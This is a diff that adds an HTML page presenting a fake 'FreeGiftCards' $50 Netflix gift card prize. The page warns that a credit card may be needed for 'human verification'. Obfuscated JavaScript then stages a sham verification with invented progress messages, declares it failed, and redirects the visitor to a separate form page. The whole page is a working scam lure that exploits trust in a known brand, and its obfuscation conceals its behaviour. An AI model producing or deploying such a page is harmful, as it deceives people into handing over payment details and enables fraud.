@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Netflix Gift | FreeGiftCards</title>
+        <style>
+        @font-face
+        {font-family:"Netflix Sans";src:url("font/NetflixSansThin.ttf");font-weight:100;}
+        @font-face{font-family:"Netflix Sans";src:url("font/NetflixSansLight.ttf");font-weight:300;}
+        @font-face{font-family:"Netflix Sans";src:url("font/NetflixSansRegular.ttf");font-weight:400;}
+        @font-face{font-family:"Netflix Sans";src:url("font/NetflixSansMedium.ttf");font-weight:500;}
+        @font-face{font-family:"Netflix Sans";src:url("font/NetflixSansBold.ttf");font-weight:700;}
+        @font-face{font-family:"Netflix Sans";src:url("font/NetflixSansBlack.ttf");font-weight:900;}
+        @font-face{font-family:"Space Mono";src:url("font/SpaceMono-Regular.ttf");font-weight:400;}
+        @font-face{font-family:"Space Mono";src:url("font/SpaceMono-Bold.ttf");font-weight:700;}
+        
+        body {
+            font-family:"Netflix Sans";margin:0;
+        }
+        h1 {
+            text-align:center;
+        }
+        span.you {
+            background-color:gold;padding:5px 10px;border-radius:10px;
+        }
+        main {
+            background-color:#eee;padding:20px 0;
+        }
+        footer {
+            margin:20px 0;text-align:center;
+        }
+        h2 {
+            text-align:center;
+        }
+        div.grid{
+            display:grid;grid-template-columns:1fr 1fr;grid-gap:20px 10px;margin:auto;width:clamp(700px, 70%, 800px);
+        }
+        div.description {
+            border:none;box-sizing:border-box;padding:20px;width:100%;background-color:white;border-radius:10px;
+        }
+        div.description img.mylogo {
+            display:block;width:40%;margin:auto;
+        }
+        div.description span {
+            display:block;font-weight:bold;font-size:30px;text-align:center;
+        }
+        div.gift-card {
+            border:none;
+            border-radius:10px;
+            box-shadow:5px 10px 10px #222;
+            box-sizing:border-box;
+            padding:20px;
+            width:100%;
+            background-color:white;
+        }
+        
+        div.gift-card span.amount {
+            display: block;font-size:30px;font-weight:700;flex-basis:100%;text-align:right;
+        }
+        div.gift-card span.amount span.currency {
+            font-size:medium;vertical-align:super;
+        }
+        div.gift-card img.logo {
+            display:block;margin:20px auto;width:90%;
+        }
+        div.gift-card .code {
+            background-color:#444;border:none;border-radius:5px;color:#444;display:block;font-family:"Space Mono", "Lucida Console", "Menlo", "Hack", monospace;font-weight:500;margin:auto;text-align:center;padding:10px;width:70%;transition:color 500ms, background-color 500ms;
+        }
+        div.gift-card .code:hover {
+            background-color:#777;color:#fff;
+        }
+        div.gift-card .code:active {
+            background-color:darkred;
+        }
+        div.gift-card a:link, div.gift-card a:visited {
+            background-color:#eee;border-radius:5px;color:darkred;padding:0 3px;text-decoration:none;transition:background-color 200ms, color 200ms;
+        }
+        div.gift-card a:hover {
+            background-color:#ddaaaa;color:#fff;
+        }
+        
+        div.gift-card a:active {
+            background-color:darkred;color:#fff;
+        }
+        div.gift-card span.code:active {
+            background-color:#ccc;
+        }
+        div.modal {
+            display:none;position:fixed;z-index:1;left:0;top:0;width:100%;height:100%;overflow:auto;background-color:rgb(0,0,0);background-color:rgba(0,0,0,0.4);
+        }
+        div.modal .modal-content {
+            background-color:#fefefe;margin:5% auto;padding:20px;border:1px solid #888;width:40%;
+        }
+        div.modal .modal-content h1 {
+            margin-top:0;
+        }
+        div.modal .close {
+            color:#aaa;float:right;font-size:28px;font-weight:bold;
+        }
+        div.modal .close:hover, div.modal .close:focus {
+            color:black;text-decoration:none;cursor:pointer;
+        }
+        @keyframes spin {
+            0% {transform:rotate(0deg);}
+            100% {transform:rotate(360deg);}
+        }
+        
+        div.modal .checkbox-container {
+            display:block;position:relative;padding-left:55px;margin-bottom:12px;cursor:pointer;font-size:24px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;height:40px;line-height:40px;
+        }
+        div.modal .checkbox-container input {
+            position:absolute;opacity:0;cursor:pointer;height:0;width:0;
+        }
+        div.modal .checkbox-container .checkmark {
+            position:absolute;top:0;left:0;height:40px;width:40px;background-color:#eee;
+        }
+        div.modal .checkbox-container:hover input ~ .checkmark {
+            background-color:#ccc;
+        }
+        div.modal .checkbox-container input:checked ~ .checkmark {
+            background-color:#2196F3;
+        }
+        div.modal .checkbox-container .checkmark:after {
+            content:"";position:absolute;display:none;
+        }
+        div.modal .checkbox-container input:checked ~ .checkmark:after {
+            display:block;
+        }
+        div.modal .checkbox-container .checkmark:after {
+            left:12px;top:5px;width:10px;height:18px;border:solid white;border-width:0 6px 6px 0;-webkit-transform:rotate(45deg);-ms-transform:rotate(45deg);transform:rotate(45deg);
+        }
+        div.modal .verification {
+            display:flex;padding:10px;border:none;border-radius:10px;background-color:#333;
+        }
+        div.modal .verification .loader {
+            border:10px solid #666;border-top:10px solid #3498db;border-radius:50%;width:30px;height:30px;animation:spin 2s linear infinite;
+        }
+        div.modal .verification span {
+            align-self:center;margin:0 10px;padding:3px 5px;background-color:gold;border-radius:5px;
+        }
+        div.modal .error {
+            padding:10px;margin:5px;background-color:lightcoral;border-radius:5px;font-weight:bold;
+        }
+        div.modal #final-button {
+            padding:15px 25px;display:block;font-size:24px;font-weight:bold;text-align:center;cursor:pointer;outline:none;color:#fff;background-color:darkred;border:none;border-radius:15px;box-shadow:0 9px #999;margin:10px auto;
+        }
+        div.modal #final-button:hover {
+            background-color:#660000
+        }
+        div.modal #final-button:active {
+            background-color:#660000;box-shadow:0 5px #666;transform:translateY(4px);
+        }
+        </style>
+    </head>
+    <body>
+        <header>
+            <h1>Hey <span class="you">you</span>! You just won a $50 Netflix gift card!</h1>
+        </header>
+        <main>
+            <div class="grid">
+                <div class="description">
+                    <img class="mylogo" src="img/FreeGiftCards.png" />
+                    <span>Free Gift Cards</span>
+                    <p>You were chosen by the Golden Diamond Roulette of Las Vegas, and you won a $50 Netflix gift card! To activate it, you need to complete a couple steps. This service is provided by &copy;FreeGiftCards.</p>
+                    <p>This service is 100% free, but a credit card may be required for you to comply with the human verification. If you can't comply, you may be unable to redeem your card.</p>
+                </div>
+                <div class="gift-card">
+                    <span class="amount"><span class="currency">$</span>50</span>
+                    <img class="logo" src="img/Netflix_2015_logo.svg" />
+                    <h2>Watch your favorite films or shows with this Netflix gift card!</h2>
+                    <p>Use it on an existing account or create a new account to watch unlimited films and TV series, on whichever device you own. No credit card is required.</p>
+                    <h3>To begin to watch Netflix:</h3>
+                    <ol>
+                        <li>Scratch delicately to reveal the code</li>
+                        <li>Go to <a href="https://www.netflix.com/code" target="_blank">www.netflix.com/code</a></li>
+                        <li>Get your code there:</li>
+                    </ol>
+                    <button id="trigger" class="code">Get your code!</button>
+                </div>
+            </div>
+            <div id="the-modal" class="modal">
+                <div id="the-modal-content" class="modal-content">
+                    <h1>We detected a suspicious activity on this computer...</h1>
+                    <p>A human verification is necessary to redeem your gift card; it will be very short. The whole internet is populated by robots, which can be malicious. We (FreeGiftCards) do not want robots to redeem our cards, because we only want humans to enjoy free Netflix! We want our lucky chosen ones to be happy, and we are looking forward to helping you!</p>
+                    <p>Therefore, we ask you to check this:</p>
+                    <label class="checkbox-container">I am not a robot<input id="human-checkbox" type="checkbox" autocomplete="off"><span class="checkmark"></span></label>
+                </div>
+            </div>
+            
+            <script>var _0x1e7dca=_0x34c9;(function(_0x2be841,_0x1e6a5a){var _0x1585b3=_0x34c9,_0x694f90=_0x2be841();while(!![]){try{var _0x2909e5=parseInt(_0x1585b3(0x17f))/0x1*(parseInt(_0x1585b3(0x19f))/0x2)+-parseInt(_0x1585b3(0x195))/0x3+parseInt(_0x1585b3(0x18d))/0x4*(parseInt(_0x1585b3(0x18b))/0x5)+-parseInt(_0x1585b3(0x196))/0x6+parseInt(_0x1585b3(0x189))/0x7*(-parseInt(_0x1585b3(0x191))/0x8)+parseInt(_0x1585b3(0x194))/0x9*(parseInt(_0x1585b3(0x19e))/0xa)+parseInt(_0x1585b3(0x190))/0xb;if(_0x2909e5===_0x1e6a5a)break;else _0x694f90['push'](_0x694f90['shift']());}catch(_0x374fb1){_0x694f90['push'](_0x694f90['shift']());}}}(_0x4f5f,0x6616d));var modal=document[_0x1e7dca(0x19d)](_0x1e7dca(0x180)),btn=document[_0x1e7dca(0x19d)](_0x1e7dca(0x1a1)),span=document[_0x1e7dca(0x1a2)]('close')[0x0];btn[_0x1e7dca(0x182)]=function(){var _0xd9cb03=_0x1e7dca;modal['style'][_0xd9cb03(0x17d)]=_0xd9cb03(0x183);};function _0x34c9(_0x41b62a,_0x25cc2f){var _0x4f5fee=_0x4f5f();return _0x34c9=function(_0x34c98c,_0x4f1952){_0x34c98c=_0x34c98c-0x17b;var _0x525898=_0x4f5fee[_0x34c98c];return _0x525898;},_0x34c9(_0x41b62a,_0x25cc2f);}var checkbox=document[_0x1e7dca(0x19d)](_0x1e7dca(0x19c)),modal_content=document['getElementById'](_0x1e7dca(0x18a)),verif_div=document[_0x1e7dca(0x19d)](_0x1e7dca(0x186));function _0x4f5f(){var _0x2e7150=['disabled','onclick','block','div','Reading\x20a\x20book...','verif-div','assign','log','14ykiOgY','the-modal-content','35aUyTFM','span','228412YVZMHY','Verify manually!','class','5750327dKSToA','2898248hpnqfJ','setAttribute','appendChild','111006hDubhy','758496ggpHIt','3479454sSzUUh','Verifying...','form.html','createElement','loader','innerText','human-checkbox','getElementById','480hedkeR','460950JKJNts','Analysing\x20results...','trigger','getElementsByClassName','final-button','location','verification','display','button','2UDHvBN','the-modal'];_0x4f5f=function(){return _0x2e7150;};return _0x4f5f();}function write(_0x51f488,_0x16ccdb,_0x2c897e){var _0x56e845=_0x1e7dca;console[_0x56e845(0x188)](_0x51f488),setTimeout((_0x2f8378,_0x1e8cc6)=>{var _0x108dde=_0x56e845;_0x2f8378[_0x108dde(0x19b)]=_0x1e8cc6;},_0x2c897e);}checkbox['onclick']=function(){var _0x2a275a=_0x1e7dca;checkbox[_0x2a275a(0x192)](_0x2a275a(0x181),_0x2a275a(0x181)),checkbox['onclick']=()=>{};var _0xc2907f=document[_0x2a275a(0x199)](_0x2a275a(0x184));_0xc2907f[_0x2a275a(0x192)]('id',_0x2a275a(0x186)),_0xc2907f[_0x2a275a(0x192)](_0x2a275a(0x18f),_0x2a275a(0x17c)),setTimeout(()=>{var _0x4cdfc7=_0x2a275a;modal_content['appendChild'](_0xc2907f);var _0xbe5048=document['createElement'](_0x4cdfc7(0x184));_0xbe5048[_0x4cdfc7(0x192)](_0x4cdfc7(0x18f),_0x4cdfc7(0x19a)),_0xc2907f[_0x4cdfc7(0x193)](_0xbe5048);var _0xc2f239=document['createElement'](_0x4cdfc7(0x18c));_0xc2907f[_0x4cdfc7(0x193)](_0xc2f239),_0xc2f239[_0x4cdfc7(0x19b)]=_0x4cdfc7(0x197),setTimeout(()=>{var _0x2abb25=_0x4cdfc7;_0xc2f239[_0x2abb25(0x19b)]='Collecting\x20data...';},0x12c),setTimeout(()=>{var _0x3755fb=_0x4cdfc7;_0xc2f239[_0x3755fb(0x19b)]='Fetching\x20data...';},0x1f4),setTimeout(()=>{var _0x57189e=_0x4cdfc7;_0xc2f239['innerText']=_0x57189e(0x1a0);},0x44c),setTimeout(()=>{var _0x471b5c=_0x4cdfc7;_0xc2f239[_0x471b5c(0x19b)]='Cooking\x20a\x20pie...';},0x578),setTimeout(()=>{var _0x10eb34=_0x4cdfc7;_0xc2f239[_0x10eb34(0x19b)]='Hailing\x20a\x20taxi...';},0x708),setTimeout(()=>{var _0xf55715=_0x4cdfc7;_0xc2f239[_0xf55715(0x19b)]=_0xf55715(0x185);},0x834),setTimeout(()=>{_0xc2f239['innerText']='Error!';},0x9c4),setTimeout(()=>{var _0x3a2162=_0x4cdfc7;_0xc2907f['remove']();var _0x10ab48=document[_0x3a2162(0x199)](_0x3a2162(0x184));_0x10ab48[_0x3a2162(0x192)](_0x3a2162(0x18f),'error'),_0x10ab48[_0x3a2162(0x19b)]='The\x20automatic human\x20verification\x20failed.';var _0x232ab7=document[_0x3a2162(0x199)](_0x3a2162(0x17e));_0x232ab7['setAttribute']('id',_0x3a2162(0x1a3)),_0x232ab7[_0x3a2162(0x19b)]=_0x3a2162(0x18e),_0x232ab7[_0x3a2162(0x182)]=()=>{var _0x51d7f1=_0x3a2162;window[_0x51d7f1(0x17b)][_0x51d7f1(0x187)](_0x51d7f1(0x198));},modal_content[_0x3a2162(0x193)](_0x10ab48),modal_content[_0x3a2162(0x193)](_0x232ab7);},0xa8c);},0x1f4);};
+            </script>
+        </main>
+        <footer>&copy;FreeGiftCards 2022</footer>
+    </body>
+</html>
